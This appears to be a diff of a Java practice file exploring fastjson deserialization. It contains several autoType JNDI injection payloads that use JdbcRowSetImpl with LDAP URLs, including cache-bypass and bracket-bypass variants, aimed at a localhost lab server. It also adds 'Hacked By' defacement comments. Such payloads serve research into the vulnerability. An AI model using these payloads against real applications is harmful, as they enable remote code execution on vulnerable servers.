@@ -13,19 +13,23 @@ import com.alibaba.fastjson.JSONObject;
 public class demo {
     public static void main(String[] args) {
 //        String s = "{\"param1\":\"test1\",\"param2\":\"test2\"}";
-//        String s2 = "{\"age\":18,\"name\":\"Y5neKO\"}";
+        String s2 = "{\"age\":18,\"name\":\"Y5neKO\"}";
+        //lidy4x1到此一游
+        //hello
+        //Hacked By lidy4x1
 //        JSONObject jsonObject = JSON.parseObject(s);
-//        Person person = JSON.parseObject(s2, Person.class);
+        Person person = JSON.parseObject(s2, Person.class);
 //        System.out.println(jsonObject);
 //        System.out.println(jsonObject.getString("param1"));
 //        System.out.println("------------");
-//        System.out.println(person.getName());
+        System.out.println(person.getName());
         //String s3 = "{\"@type\":\"com.y5neko.sec.fastjson.Person\",\"age\":18,\"name\":\"abc\"}";
-        String s3 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/HfNCBhSf\",\"AutoCommit\":\"true\"}";
+        //String s3 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/BQzUrKoA\",\"AutoCommit\":\"true\"}";
         //Object object1 = JSON.parse(s3);
         //Object object2 = JSON.parseObject(s3, Person.class);
-        String s4 = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/cgQuBZlq\",\"AutoCommit\":\"false\"}}";
-        Object object3 = JSON.parseObject(s4);
+        //String s4 = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/BQzUrKoA\",\"AutoCommit\":\"false\"}}";
+        //String s3 = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"DataSourceName\":\"ldap://127.0.0.1:8085/BQzUrKoA\",\"AutoCommit\":1}";
+        //Object object3 = JSON.parseObject(s3);
 //        System.out.println("-------------");
 //        System.out.println("object1:");
 //        System.out.println(object1);
